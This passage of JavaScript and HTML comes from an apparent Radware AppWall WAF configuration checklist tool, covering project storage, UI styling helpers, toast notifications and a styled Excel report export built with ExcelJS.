        const taskText = task.querySelector('.task-text')?.textContent.toLowerCase() || '';
        const taskPriority = task.getAttribute('data-priority');
        
        const textMatch = taskText.includes(searchQuery);
        const priorityMatch = !filterActive || taskPriority === document.getElementById('filter-dropdown')?.value;
        
        if (textMatch && priorityMatch) {
            task.style.display = 'flex';
        } else {
            task.style.display = 'none';
        }
    });
}

// --- Project Management ---
function loadProjectsFromStorage() {
    try {
        const data = localStorage.getItem(STORAGE_KEY);
        if (data) {
            projects = JSON.parse(data);
            
            // Load first project or create default
            if (Object.keys(projects).length > 0) {
                currentProject = projects[Object.keys(projects)[0]];
                
                // If project has findings, load them
                if (currentProject.findingDetails && currentProject.findingDetails.length > 0) {
                    appwallData.findings = currentProject.findingDetails;
                }
            } else {
                createDefaultProject();
            }
        } else {
            createDefaultProject();
        }
    } catch (error) {
        console.error('Error loading projects from storage:', error);
        createDefaultProject();
    }
}

function createDefaultProject() {
    const defaultId = 'default';
    currentProject = {
        id: defaultId,
        name: 'Radware AppWall Configuration',
        target: 'production.example.com',
        date: new Date().toISOString().split('T')[0],
        tester: 'WAF Administrator',
        scope: 'E-commerce platform, Customer portal, Admin interface',
        lastUpdated: new Date().toISOString(),
        taskStatus: {},
        notes: {},
        findingDetails: [...appwallData.findings] // Clone initial findings
    };
    
    projects = { [defaultId]: currentProject };
    saveProjectToStorage();
}

function saveProjectToStorage() {
    try {
        if (currentProject && currentProject.id) {
            // Update the current project in the projects object
            projects[currentProject.id] = currentProject;
            
            // Save all projects to localStorage
            localStorage.setItem(STORAGE_KEY, JSON.stringify(projects));
        }
    } catch (error) {
        console.error('Error saving project to storage:', error);
        showToast('Failed to save project. Storage might be full.', 'error');
    }
}

function updateProjectUI() {
    if (!currentProject) return;
    
    // Update project info section
    document.getElementById('project-name').textContent = currentProject.name || 'Unnamed Project';
    document.getElementById('project-target').textContent = currentProject.target || 'N/A';
    document.getElementById('project-date').textContent = formatDate(currentProject.date);
    document.getElementById('project-tester').textContent = currentProject.tester || 'N/A';
    document.getElementById('project-scope').textContent = currentProject.scope || 'N/A';
    document.getElementById('project-updated').textContent = formatDate(currentProject.lastUpdated);
}

// --- Helper Functions ---
function getCategoryTitle(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.title : 'Unknown Category';
}

function getCategorySubtitle(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.subtitle : '';
}

// Initialize category data if needed
function initializeCategoryData(categoryId) {
    // This function would populate any missing data for the category
    // such as techniques, tools, etc. before rendering
    // In a complete implementation, it might load data from a central repository
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    
    try {
        const date = new Date(dateString);
        return date.toLocaleDateString();
    } catch (e) {
        return dateString;
    }
}

function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function getPriorityClass(priority) {
    switch (priority) {
        case 'critical':
            return {
                bgClass: 'bg-status-critical/10',
                textClass: 'text-status-critical',
                bgSolid: 'bg-status-critical'
            };
        case 'high':
            return {
                bgClass: 'bg-status-high/10',
                textClass: 'text-status-high',
                bgSolid: 'bg-status-high'
            };
        case 'medium':
            return {
                bgClass: 'bg-status-medium/10',
                textClass: 'text-status-medium',
                bgSolid: 'bg-status-medium'
            };
        default:
            return {
                bgClass: 'bg-radware-primary/10',
                textClass: 'text-radware-primary',
                bgSolid: 'bg-radware-primary'
            };
    }
}

function getPriorityIndicator(priority) {
    switch (priority) {
        case 'critical':
            return 'bg-status-critical';
        case 'high':
            return 'bg-status-high';
        case 'medium':
            return 'bg-status-medium';
        case 'low':
            return 'bg-status-low';
        default:
            return '';
    }
}

function getSeverityClasses(severity) {
    switch (severity) {
        case 'high':
            return {
                bgClass: 'bg-status-critical/10',
                textClass: 'text-status-critical'
            };
        case 'medium':
            return {
                bgClass: 'bg-status-high/10',
                textClass: 'text-status-high'
            };
        case 'low':
            return {
                bgClass: 'bg-status-medium/10',
                textClass: 'text-status-medium'
            };
        case 'info':
            return {
                bgClass: 'bg-radware-primary/10',
                textClass: 'text-radware-primary'
            };
        default:
            return {
                bgClass: 'bg-gray-100',
                textClass: 'text-gray-700'
            };
    }
}

function formatConfigCommands(configText) {
    if (!configText) return '';
    
    // Split the config text into lines
    const lines = configText.split('\n');
    
    // Process each line to add proper HTML formatting
    return lines.map(line => {
        if (line.trim().startsWith('#')) {
            // Comment line
            return `<div class="code-comment">${escapeHtml(line)}</div>`;
        } else {
            // Command line - identify the command part and parameters
            const parts = line.split(' ');
            if (parts.length < 2) return `<div>${escapeHtml(line)}</div>`;
            
            const command = parts[0];
            const rest = parts.slice(1).join(' ');
            
            return `<div><span class="code-command">${escapeHtml(command)}</span> ${escapeHtml(rest)}</div>`;
        }
    }).join('');
}

function escapeHtml(text) {
    // Basic HTML escaping for security
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container');
    if (!container) return;
    
    const toast = document.createElement('div');
    toast.className = `rounded-lg p-4 mb-3 flex items-center shadow-lg transform transition-all duration-300 translate-x-full opacity-0`;
    
    // Set background color based on type
    if (type === 'success') {
        toast.classList.add('bg-green-500', 'text-white');
    } else if (type === 'error') {
        toast.classList.add('bg-red-500', 'text-white');
    } else if (type === 'warning') {
        toast.classList.add('bg-yellow-500', 'text-white');
    } else {
        toast.classList.add('bg-blue-500', 'text-white');
    }
    
    // Icon based on type
    let icon = 'fa-check-circle';
    if (type === 'error') icon = 'fa-times-circle';
    else if (type === 'warning') icon = 'fa-exclamation-circle';
    else if (type === 'info') icon = 'fa-info-circle';
    
    toast.innerHTML = `
        <i class="fas ${icon} mr-3 text-lg"></i>
        <span>${message}</span>
    `;
    
    container.appendChild(toast);
    
    // Animate in
    setTimeout(() => {
        toast.classList.remove('translate-x-full', 'opacity-0');
    }, 10);
    
    // Animate out after timeout
    setTimeout(() => {
        toast.classList.add('translate-x-full', 'opacity-0');
        setTimeout(() => {
            container.removeChild(toast);
        }, 300);
    }, 3000);
}












    </script>













<script src="https://cdn.jsdelivr.net/npm/exceljs@4.3.0/dist/exceljs.min.js"></script>
<script>
// --- Advanced Excel Export Functionality ---
let excelExportInProgress = false;

// Initialize Excel export on page load
document.addEventListener('DOMContentLoaded', function() {
    setupEnhancedExcelExport();
});

// Set up enhanced Excel export
function setupEnhancedExcelExport() {
    // Add premium floating Excel export button
    if (!document.getElementById('excel-export-btn')) {
        addPremiumExcelExportButton();
    }
    
    // Set up event listeners
    document.getElementById('excel-export-btn').addEventListener('click', function() {
        if (!excelExportInProgress) {
            startEnhancedExcelExport();
        }
    });
}

// Add premium floating Excel export button
function addPremiumExcelExportButton() {
    // Create button container for animation effects
    const buttonContainer = document.createElement('div');
    buttonContainer.className = 'fixed bottom-6 right-6 z-40';
    document.body.appendChild(buttonContainer);
    
    // Create the actual button with enhanced styling
    const button = document.createElement('button');
    button.id = 'excel-export-btn';
    button.className = 'bg-gradient-to-r from-green-600 to-green-500 text-white rounded-full w-14 h-14 flex items-center justify-center shadow-lg transition-all transform hover:scale-110 relative';
    button.innerHTML = '<i class="fas fa-file-excel text-xl"></i>';
    button.setAttribute('title', 'Export to Excel');
    buttonContainer.appendChild(button);
    
    // Add pulse animation effect
    const pulseEffect = document.createElement('span');
    pulseEffect.className = 'absolute w-full h-full rounded-full bg-green-400 opacity-75 animate-ping';
    button.appendChild(pulseEffect);
    
    // Add tooltip with enhanced styling
    const tooltip = document.createElement('div');
    tooltip.className = 'absolute right-16 bottom-2 bg-gray-800 text-white text-sm py-2 px-3 rounded opacity-0 invisible transition-all duration-200 shadow-lg';
    tooltip.innerHTML = '<span class="font-semibold">Export to Excel</span><br><span class="text-xs opacity-75">Generate detailed report</span>';
    tooltip.style.whiteSpace = 'nowrap';
    buttonContainer.appendChild(tooltip);
    
    // Show/hide tooltip on hover with animation
    button.addEventListener('mouseenter', () => {
        tooltip.classList.remove('opacity-0', 'invisible');
        tooltip.classList.add('opacity-100', 'visible');
    });
    
    button.addEventListener('mouseleave', () => {
        tooltip.classList.add('opacity-0', 'invisible');
        tooltip.classList.remove('opacity-100', 'visible');
    });
    
    // Add CSS for enhanced visual effects
    const style = document.createElement('style');
    style.textContent = `
        #excel-export-btn:hover {
            box-shadow: 0 0 20px rgba(22, 163, 74, 0.6);
        }
        @keyframes pulse-border {
            0% { box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(22, 163, 74, 0); }
            100% { box-shadow: 0 0 0 0 rgba(22, 163, 74, 0); }
        }
        #excel-export-btn {
            animation: pulse-border 2s infinite;
        }
    `;
    document.head.appendChild(style);
}

// Start the enhanced Excel export process
function startEnhancedExcelExport() {
    // Check if ExcelJS is loaded
    if (typeof ExcelJS === 'undefined') {
        // Show loading indicator during library load
        showLoadingOverlay('Loading Excel components...');
        
        loadExcelJSLibrary()
            .then(() => {
                hideLoadingOverlay();
                showEnhancedExportModal();
            })
            .catch(error => {
                hideLoadingOverlay();
                console.error('Failed to load ExcelJS:', error);
                showToast('Failed to load Excel export library. Please try again.', 'error');
            });
    } else {
        showEnhancedExportModal();
    }
}

// Load the ExcelJS library dynamically
function loadExcelJSLibrary() {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/exceljs@4.3.0/dist/exceljs.min.js';
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

// Show enhanced export modal with additional options
function showEnhancedExportModal() {
    // Create modal if it doesn't exist
    if (!document.getElementById('excel-export-modal')) {
        createEnhancedExportModal();
    }
    
    // Reset form values to defaults
    document.getElementById('excel-report-type').value = 'complete';
    document.getElementById('excel-include-notes').checked = true;
    document.getElementById('excel-include-techniques').checked = true;
    document.getElementById('excel-include-charts').checked = true;
    document.getElementById('excel-include-toc').checked = true;
    
    // Update preview based on current selection
    updateExportPreview();
    
    // Show the modal
    toggleModal('excel-export-modal', true);
}

// Create enhanced export modal with preview
function createEnhancedExportModal() {
    const modal = document.createElement('div');
    modal.id = 'excel-export-modal';
    modal.className = 'fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm';
    
    modal.innerHTML = `
        <div class="bg-white rounded-xl shadow-2xl max-w-3xl w-full">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center bg-gradient-to-r from-green-600 to-green-500 text-white rounded-t-xl">
                <h3 class="text-xl font-semibold flex items-center gap-2">
                    <i class="fas fa-file-excel"></i> Advanced Excel Export
                </h3>
                <button class="modal-close text-white/80 hover:text-white">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="flex gap-6">
                    <!-- Options Column -->
                    <div class="w-1/2">
                        <h4 class="font-semibold text-gray-700 mb-4">Export Options</h4>
                        
                        <div class="space-y-4">
                            <div>
                                <label for="excel-report-type" class="block text-sm font-medium text-gray-700 mb-1">Report Type</label>
                                <select id="excel-report-type" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-green-500 focus:ring focus:ring-green-200 transition" onchange="updateExportPreview()">
                                    <option value="complete">Complete Report (All Data)</option>
                                    <option value="summary">Summary Report (Key Metrics Only)</option>
                                    <option value="findings">Findings Report (Issues Only)</option>
                                    <option value="dashboard">Dashboard Report (Visual Only)</option>
                                </select>
                            </div>
                            
                            <div class="border-t border-gray-100 pt-4">
                                <h5 class="text-sm font-medium text-gray-700 mb-2">Content Options</h5>
                                
                                <div class="space-y-2">
                                    <label for="excel-include-notes" class="flex items-center">
                                        <input type="checkbox" id="excel-include-notes" class="rounded border-gray-300 text-green-600 focus:ring-green-500" checked onchange="updateExportPreview()">
                                        <span class="ml-2 text-sm text-gray-700">Include category notes</span>
                                    </label>
                                    
                                    <label for="excel-include-techniques" class="flex items-center">
                                        <input type="checkbox" id="excel-include-techniques" class="rounded border-gray-300 text-green-600 focus:ring-green-500" checked onchange="updateExportPreview()">
                                        <span class="ml-2 text-sm text-gray-700">Include configuration techniques</span>
                                    </label>
                                    
                                    <label for="excel-include-charts" class="flex items-center">
                                        <input type="checkbox" id="excel-include-charts" class="rounded border-gray-300 text-green-600 focus:ring-green-500" checked onchange="updateExportPreview()">
                                        <span class="ml-2 text-sm text-gray-700">Include visual charts</span>
                                    </label>
                                    
                                    <label for="excel-include-toc" class="flex items-center">
                                        <input type="checkbox" id="excel-include-toc" class="rounded border-gray-300 text-green-600 focus:ring-green-500" checked onchange="updateExportPreview()">
                                        <span class="ml-2 text-sm text-gray-700">Include table of contents</span>
                                    </label>
                                </div>
                            </div>
                            
                            <div class="border-t border-gray-100 pt-4">
                                <h5 class="text-sm font-medium text-gray-700 mb-2">Document Information</h5>
                                
                                <div>
                                    <label for="excel-custom-title" class="block text-sm font-medium text-gray-600 mb-1">Report Title</label>
                                    <input type="text" id="excel-custom-title" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-green-500 focus:ring focus:ring-green-200 transition" placeholder="Radware AppWall WAF Configuration Report" value="Radware AppWall WAF Configuration Report">
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Preview Column -->
                    <div class="w-1/2 border-l border-gray-200 pl-6">
                        <h4 class="font-semibold text-gray-700 mb-4">Report Preview</h4>
                        
                        <div id="excel-report-preview" class="bg-gray-50 rounded-lg p-4 h-64 overflow-y-auto border border-gray-200">
                            <!-- Preview content will be dynamically inserted here -->
                        </div>
                        
                        <div class="mt-4 text-sm text-gray-500">
                            <div class="flex items-center">
                                <i class="fas fa-info-circle mr-2 text-blue-500"></i> 
                                <span>The generated Excel report will contain <span id="excel-sheet-count">5</span> worksheets.</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-between items-center bg-gray-50 rounded-b-xl">
                <div id="excel-export-status" class="text-sm text-gray-500 hidden">
                    <div class="flex items-center">
                        <div class="mr-2 h-5 w-5 relative">
                            <div class="animate-spin absolute inset-0 h-full w-full border-2 border-green-500 border-t-transparent rounded-full"></div>
                            <div class="absolute inset-0 flex items-center justify-center text-xs font-bold text-green-600" id="excel-progress-text"></div>
                        </div>
                        <span id="excel-status-text">Generating report...</span>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">
                        Cancel
                    </button>
                    <button id="excel-generate-btn" class="px-4 py-2 bg-gradient-to-r from-green-600 to-green-500 hover:from-green-700 hover:to-green-600 text-white rounded-lg transition flex items-center gap-2">
                        <i class="fas fa-file-export"></i> Generate Excel Report
                    </button>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Set up event listeners
    modal.querySelector('.modal-close').addEventListener('click', function() {
        toggleModal('excel-export-modal', false);
    });
    
    document.getElementById('excel-generate-btn').addEventListener('click', function() {
        if (!excelExportInProgress) {
            generateEnhancedExcelReport();
        }
    });
    
    // Add global function for updating preview
    window.updateExportPreview = function() {
        const reportType = document.getElementById('excel-report-type').value;
        const includeNotes = document.getElementById('excel-include-notes').checked;
        const includeTechniques = document.getElementById('excel-include-techniques').checked;
        const includeCharts = document.getElementById('excel-include-charts').checked;
        const includeToc = document.getElementById('excel-include-toc').checked;
        
        const previewContainer = document.getElementById('excel-report-preview');
        
        // Calculate sheet count
        let sheetCount = 1; // Always have Overview sheet
        
        if (reportType === 'complete') {
            sheetCount += appwallData.categories.length; // One sheet per category
            sheetCount += 1; // Findings sheet
            if (includeCharts) sheetCount += 1; // Charts sheet
            if (includeToc) sheetCount += 1; // TOC sheet
        } else if (reportType === 'summary') {
            sheetCount = 3; // Overview, Summary, Charts (if enabled)
            if (!includeCharts) sheetCount--;
        } else if (reportType === 'findings') {
            sheetCount = 2; // Overview and Findings
        } else if (reportType === 'dashboard') {
            sheetCount = 2; // Overview and Dashboard
        }
        
        document.getElementById('excel-sheet-count').textContent = sheetCount;
        
        // Build preview HTML based on selection
        let previewHTML = '';
        
        // Always show Overview sheet
        previewHTML += `
            <div class="preview-sheet bg-white border border-gray-300 shadow-sm rounded mb-3 overflow-hidden">
                <div class="bg-green-100 px-3 py-1 border-b border-gray-300 flex justify-between items-center">
                    <span class="font-medium text-sm text-green-800">Overview</span>
                    <span class="text-xs text-gray-500"><i class="fas fa-table"></i></span>
                </div>
                <div class="p-2">
                    <div class="text-xs text-gray-700 mb-1 font-medium">â¢ Project information</div>
                    <div class="text-xs text-gray-700 mb-1">â¢ Completion statistics</div>
                    <div class="text-xs text-gray-700">â¢ Overall progress summary</div>
                </div>
            </div>
        `;
        
        // Show Table of Contents if selected
        if (includeToc && (reportType === 'complete' || reportType === 'dashboard')) {
            previewHTML += `
                <div class="preview-sheet bg-white border border-gray-300 shadow-sm rounded mb-3 overflow-hidden">
                    <div class="bg-blue-100 px-3 py-1 border-b border-gray-300 flex justify-between items-center">
                        <span class="font-medium text-sm text-blue-800">Table of Contents</span>
                        <span class="text-xs text-gray-500"><i class="fas fa-list"></i></span>
                    </div>
                    <div class="p-2">
                        <div class="text-xs text-gray-700 mb-1">â¢ Interactive navigation links</div>
                        <div class="text-xs text-gray-700">â¢ Worksheet directory with descriptions</div>
                    </div>
                </div>
            `;
        }
        
        // Show Charts sheet if selected
        if (includeCharts && (reportType === 'complete' || reportType === 'summary' || reportType === 'dashboard')) {
            previewHTML += `
                <div class="preview-sheet bg-white border border-gray-300 shadow-sm rounded mb-3 overflow-hidden">
                    <div class="bg-purple-100 px-3 py-1 border-b border-gray-300 flex justify-between items-center">
                        <span class="font-medium text-sm text-purple-800">Charts & Visualizations</span>
                        <span class="text-xs text-gray-500"><i class="fas fa-chart-pie"></i></span>
                    </div>
                    <div class="p-2">
                        <div class="text-xs text-gray-700 mb-1">â¢ Category completion chart</div>
                        <div class="text-xs text-gray-700 mb-1">â¢ Priority distribution chart</div>
                        <div class="text-xs text-gray-700">â¢ Findings severity breakdown</div>
                    </div>
                </div>
            `;
        }
        
        // Show category sheets for complete report
        if (reportType === 'complete') {
            previewHTML += `
                <div class="preview-sheet bg-white border border-gray-300 shadow-sm rounded mb-3 overflow-hidden">
                    <div class="bg-yellow-100 px-3 py-1 border-b border-gray-300 flex justify-between items-center">
                        <span class="font-medium text-sm text-yellow-800">Category Sheets (${appwallData.categories.length})</span>
                        <span class="text-xs text-gray-500"><i class="fas fa-folder"></i></span>
                    </div>
                    <div class="p-2">
                        <div class="text-xs text-gray-700 mb-1">â¢ Detailed checklist items with status</div>
                        ${includeTechniques ? '<div class="text-xs text-gray-700 mb-1">â¢ Configuration techniques</div>' : ''}
                        ${includeNotes ? '<div class="text-xs text-gray-700">â¢ Category notes</div>' : ''}
                    </div>
                </div>
            `;
        }
        
        // Show Findings sheet (if report type is complete or findings)
        if (reportType === 'complete' || reportType === 'findings') {
            previewHTML += `
                <div class="preview-sheet bg-white border border-gray-300 shadow-sm rounded mb-3 overflow-hidden">
                    <div class="bg-red-100 px-3 py-1 border-b border-gray-300 flex justify-between items-center">
                        <span class="font-medium text-sm text-red-800">Findings & Issues</span>
                        <span class="text-xs text-gray-500"><i class="fas fa-exclamation-triangle"></i></span>
                    </div>
                    <div class="p-2">
                        <div class="text-xs text-gray-700 mb-1">â¢ Configuration issues by severity</div>
                        <div class="text-xs text-gray-700 mb-1">â¢ Detailed remediation steps</div>
                        <div class="text-xs text-gray-700">â¢ Configuration commands</div>
                    </div>
                </div>
            `;
        }
        
        previewContainer.innerHTML = previewHTML;
    };
    
    // Initial preview update
    window.updateExportPreview();
}

// Generate enhanced Excel report
async function generateEnhancedExcelReport() {
    if (excelExportInProgress) return;
    
    excelExportInProgress = true;
    
    // Get export options
    const reportType = document.getElementById('excel-report-type').value;
    const includeNotes = document.getElementById('excel-include-notes').checked;
    const includeTechniques = document.getElementById('excel-include-techniques').checked;
    const includeCharts = document.getElementById('excel-include-charts').checked;
    const includeToc = document.getElementById('excel-include-toc').checked;
    const customTitle = document.getElementById('excel-custom-title').value.trim() || 
                         'Radware AppWall WAF Configuration Report';
    
    try {
        // Show loading state
        document.getElementById('excel-export-status').classList.remove('hidden');
        document.getElementById('excel-generate-btn').disabled = true;
        document.getElementById('excel-generate-btn').innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Generating...';
        
        // Create a new workbook
        const workbook = new ExcelJS.Workbook();
        
        // Set workbook properties
        workbook.creator = 'Radware AppWall Checklist Tool';
        workbook.lastModifiedBy = 'Radware AppWall Checklist Tool';
        workbook.created = new Date();
        workbook.modified = new Date();
        workbook.properties.date1904 = false;
        
        // Set custom title as workbook title
        workbook.title = customTitle;
        workbook.subject = 'WAF Configuration Status';
        workbook.keywords = 'radware,appwall,waf,security,configuration';
        workbook.category = 'Security Compliance';
        workbook.company = 'Radware';
        
        // Calculate total worksheets for progress tracking
        let totalSheets = 1; // Overview sheet
        
        if (includeToc && (reportType === 'complete' || reportType === 'dashboard')) totalSheets++;
        if (includeCharts && (reportType === 'complete' || reportType === 'summary' || reportType === 'dashboard')) totalSheets++;
        if (reportType === 'complete') totalSheets += appwallData.categories.length;
        if (reportType === 'complete' || reportType === 'findings') totalSheets++;
        
        let currentSheet = 0;
        
        // Keep track of used worksheet names
        const usedSheetNames = new Set();
        
        // Update progress indicator function
        const updateProgress = (sheetName) => {
            currentSheet++;
            const percent = Math.round((currentSheet / totalSheets) * 100);
            document.getElementById('excel-progress-text').textContent = `${percent}%`;
            document.getElementById('excel-status-text').textContent = `Generating ${sheetName} sheet (${currentSheet}/${totalSheets})...`;
        };
        
        // Add table of contents if requested
        if (includeToc && (reportType === 'complete' || reportType === 'dashboard')) {
            updateProgress('Table of Contents');
            await addWorksheet(workbook, 'Contents', sheet => createTableOfContentsWorksheet(sheet, reportType, includeCharts));
            usedSheetNames.add('contents');
        }
        
        // Add overview worksheet
        updateProgress('Overview');
        await addWorksheet(workbook, 'Overview', sheet => createEnhancedOverviewWorksheet(sheet, customTitle));
        usedSheetNames.add('overview');
        
        // Add charts worksheet if requested
        if (includeCharts && (reportType === 'complete' || reportType === 'summary' || reportType === 'dashboard')) {
            updateProgress('Charts');
            await addWorksheet(workbook, 'Charts', sheet => createChartsWorksheet(sheet));
            usedSheetNames.add('charts');
        }
        
        // Add category worksheets for complete report
        if (reportType === 'complete') {
            // Process each category
            for (let i = 0; i < appwallData.categories.length; i++) {
                const category = appwallData.categories[i];
                updateProgress(category.title);
                
                // Create a safe worksheet name
                const safeName = createSafeWorksheetName(category.title, i, usedSheetNames);
                
                // Add the worksheet
                await addWorksheet(workbook, safeName, sheet => 
                    createEnhancedCategoryWorksheet(sheet, category, includeTechniques, includeNotes));
                
                // Track the name we used
                usedSheetNames.add(safeName.toLowerCase());
            }
        }
        
        // Add findings worksheet
        if (reportType === 'complete' || reportType === 'findings') {
            updateProgress('Findings');
            await addWorksheet(workbook, 'Findings', sheet => createEnhancedFindingsWorksheet(sheet));
            usedSheetNames.add('findings');
        }
        
        // Generate the Excel file
        const buffer = await workbook.xlsx.writeBuffer();
        
        // Download the file
        saveExcelFile(buffer);
        
        // Hide loading state and close modal
        document.getElementById('excel-export-status').classList.add('hidden');
        document.getElementById('excel-generate-btn').disabled = false;
        document.getElementById('excel-generate-btn').innerHTML = '<i class="fas fa-file-export mr-2"></i> Generate Excel Report';
        
        toggleModal('excel-export-modal', false);
        
        showToast('Excel report generated successfully', 'success');
    } catch (error) {
        console.error('Error generating Excel report:', error);
        
        // Reset the UI
        document.getElementById('excel-export-status').classList.add('hidden');
        document.getElementById('excel-generate-btn').disabled = false;
        document.getElementById('excel-generate-btn').innerHTML = '<i class="fas fa-file-export mr-2"></i> Generate Excel Report';
        
        showToast('Error generating Excel report: ' + error.message, 'error');
    } finally {
        excelExportInProgress = false;
    }
}

// Create table of contents worksheet
function createTableOfContentsWorksheet(worksheet, reportType, includeCharts) {
    // Add title
    const titleRow = worksheet.addRow(['Table of Contents']);
    titleRow.font = { bold: true, size: 18 };
    titleRow.height = 36;
    
    // Merge cells for the title
    worksheet.mergeCells('A1:E1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    
    // Style the title with gradient fill
    titleRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FF4F81BD'}},
            {position: 1, color: {argb: 'FF95B3D7'}}
        ]
    };
    titleRow.getCell(1).font = { bold: true, size: 18, color: { argb: 'FFFFFF' } };
    
    // Add subtitle
    const subtitleRow = worksheet.addRow(['Click on any worksheet name to navigate directly to that sheet']);
    subtitleRow.font = { italic: true };
    worksheet.mergeCells('A2:E2');
    subtitleRow.alignment = { horizontal: 'center' };
    subtitleRow.height = 24;
    
    // Add empty row
    worksheet.addRow([]);
    
    // Add headers
    const headerRow = worksheet.addRow(['Worksheet', 'Description', 'Type', 'Status', 'Link']);
    
    // Style header row
    headerRow.eachCell((cell) => {
        cell.font = { bold: true };
        cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: '4F81BD' }
        };
        cell.alignment = { horizontal: 'center', vertical: 'middle' };
        cell.border = {
            top: { style: 'thin' },
            left: { style: 'thin' },
            bottom: { style: 'thin' },
            right: { style: 'thin' }
        };
        cell.font = { bold: true, color: { argb: 'FFFFFF' } };
    });
    
    // Prepare TOC entries
    const tocEntries = [];
    
    // Add overview entry
    tocEntries.push({
        name: 'Overview',
        description: 'Project information and overall completion statistics',
        type: 'Summary',
        status: 'Available'
    });
    
    // Add charts entry if included
    if (includeCharts) {
        tocEntries.push({
            name: 'Charts',
            description: 'Visual charts and graphs showing completion status',
            type: 'Visualization',
            status: 'Available'
        });
    }
    
    // Add category entries for complete report
    if (reportType === 'complete') {
        appwallData.categories.forEach((category, index) => {
            // Get safe name that was actually used in the workbook
            const safeName = createSafeWorksheetName(category.title, index, new Set());
            
            tocEntries.push({
                name: safeName,
                description: category.subtitle,
                type: 'Category',
                status: 'Available'
            });
        });
    }
    
    // Add findings entry for complete or findings report
    if (reportType === 'complete' || reportType === 'findings') {
        tocEntries.push({
            name: 'Findings',
            description: 'Configuration issues and remediation steps',
            type: 'Issues',
            status: appwallData.findings && appwallData.findings.length > 0 ? 'Available' : 'No issues found'
        });
    }
    
    // Add TOC entries to worksheet
    tocEntries.forEach(entry => {
        const row = worksheet.addRow([
            entry.name,
            entry.description,
            entry.type,
            entry.status,
            'Go to Sheet'
        ]);
        
        // Style the row
        row.eachCell((cell, colNumber) => {
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            
            // Center type and status columns
            if (colNumber === 3 || colNumber === 4) {
                cell.alignment = { horizontal: 'center' };
            }
            
            // Style the link column
            if (colNumber === 5) {
                cell.font = { color: { argb: '0563C1' }, underline: true };
                cell.alignment = { horizontal: 'center' };
                
                // Add hyperlink to the sheet
                cell.value = { 
                    text: 'Go to Sheet',
                    hyperlink: `#${entry.name}!A1`
                };
            }
            
            // Style type column with colors
            if (colNumber === 3) {
                switch (entry.type) {
                    case 'Summary':
                        cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'DDEBF7' } };
                        break;
                    case 'Visualization':
                        cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'E1D3F4' } };
                        break;
                    case 'Category':
                        cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFF2CC' } };
                        break;
                    case 'Issues':
                        cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FCE4E4' } };
                        break;
                }
            }
            
            // Style status column
            if (colNumber === 4) {
                if (entry.status === 'Available') {
                    cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'E2EFDA' } };
                } else if (entry.status === 'No issues found') {
                    cell.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'EDEDED' } };
                }
            }
        });
    });
    
    // Set column widths
    worksheet.getColumn(1).width = 25; // Worksheet name
    worksheet.getColumn(2).width = 50; // Description
    worksheet.getColumn(3).width = 15; // Type 
    worksheet.getColumn(4).width = 15; // Status
    worksheet.getColumn(5).width = 15; // Link
    
    // Add instructions
    worksheet.addRow([]);
    
    const instructionsRow = worksheet.addRow(['To navigate between sheets, click on the sheet tabs at the bottom of Excel or use the links in the "Link" column above.']);
    worksheet.mergeCells(`A${instructionsRow.number}:E${instructionsRow.number}`);
    instructionsRow.font = { italic: true, color: { argb: '666666' } };
}

// Create enhanced overview worksheet with more styling and information
function createEnhancedOverviewWorksheet(worksheet, customTitle) {
    // Add custom logo if available (placeholder for a real implementation)
    // In a real app, you might add a company logo as an image here
    
    // Add stylish title with gradient background
    const titleRow = worksheet.addRow([customTitle]);
    titleRow.font = { bold: true, size: 20 };
    titleRow.height = 40;
    
    // Merge cells for the title
    worksheet.mergeCells('A1:G1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    
    // Style the title with gradient fill
    titleRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FF13522B'}},
            {position: 1, color: {argb: 'FF16A34A'}}
        ]
    };
    titleRow.getCell(1).font = { bold: true, size: 20, color: { argb: 'FFFFFF' } };
    
    // Add date with nice formatting
    const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    const dateRow = worksheet.addRow([`Generated on ${new Date().toLocaleDateString(undefined, dateOptions)}`]);
    dateRow.font = { italic: true };
    worksheet.mergeCells('A2:G2');
    dateRow.alignment = { horizontal: 'center' };
    dateRow.height = 24;
    
    // Add decorative separator
    const separatorRow = worksheet.addRow(['']);
